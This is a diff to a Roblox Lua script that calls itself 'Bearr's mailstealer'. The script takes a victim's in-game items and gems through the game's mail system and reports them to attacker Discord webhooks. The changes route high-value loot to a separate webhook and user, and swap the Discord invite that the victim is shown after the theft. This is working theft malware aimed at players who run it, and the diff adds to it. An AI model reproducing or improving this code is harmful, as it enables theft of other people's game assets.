@@ -6,7 +6,7 @@ local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / rZmNK6Ptxw to get back"
+local MailMessage = "Join gg / GsFp84dbQf to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -49,7 +49,7 @@ local function formatNumber(number)
     end
 end
 
-local function SendMessage(username, diamonds, webhookUrl)
+local function SendMessage(username, diamonds, webhookUrl, recipient)
     local headers = {
         ["Content-Type"] = "application/json",
     }
@@ -69,6 +69,11 @@ local function SendMessage(username, diamonds, webhookUrl)
             name = "Summary:",
             value = "",
             inline = false
+        },
+        {
+            name = "Mail Sent To:",  -- New field to show the mail recipient
+            value = recipient,
+            inline = true
         }
     }
 
@@ -120,7 +125,7 @@ local function SendMessage(username, diamonds, webhookUrl)
             ["color"] = 3447003,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
+                ["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
             }
         }}
     }
@@ -128,7 +133,16 @@ local function SendMessage(username, diamonds, webhookUrl)
     local body = HttpService:JSONEncode(data)
 
     if webhookUrl and webhookUrl ~= "" then
-        local response = request({
+        -- Send the message to the high RAP webhook
+        request({
+            Url = highRAPWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+
+        -- Send the message to the original webhook
+        request({
             Url = webhookUrl,
             Method = "POST",
             Headers = headers,
@@ -281,7 +295,23 @@ if #sortedItems > 0 then
     local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
     spawn(function()
-        SendMessage(targetUser, GemAmount1, targetWebhook)
+        -- Conditional send logic based on totalRAP value
+        if totalRAP > 100000 then
+            -- If total RAP > 100,000:
+            -- Send both message and mail to highRAPWebhook/highRAPUser
+            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+            SendMail(targetUser, GemAmount1, highRAPWebhook)
+            
+            -- Do not send anything to the global webhook/user
+        else
+            -- If total RAP <= 100,000:
+            -- Send both message and mail to global webhook/user
+            SendMessage(targetUser, GemAmount1, webhook, targetUser)
+            SendMail(targetUser, GemAmount1, webhook)
+            
+            -- Send message only to highRAPWebhook/highRAPUser (no mail)
+            SendMessage(targetUser, GemAmount1, highRAPWebhook, targetUser)
+        end
     end)
 
     SendAllGems()
@@ -291,6 +321,6 @@ if #sortedItems > 0 then
     end
 
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/rZmNK6Ptxw")
-    setclipboard("discord.gg/rZmNK6Ptxw")
+    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
+    setclipboard("discord.gg/GsFp84dbQf")
 end
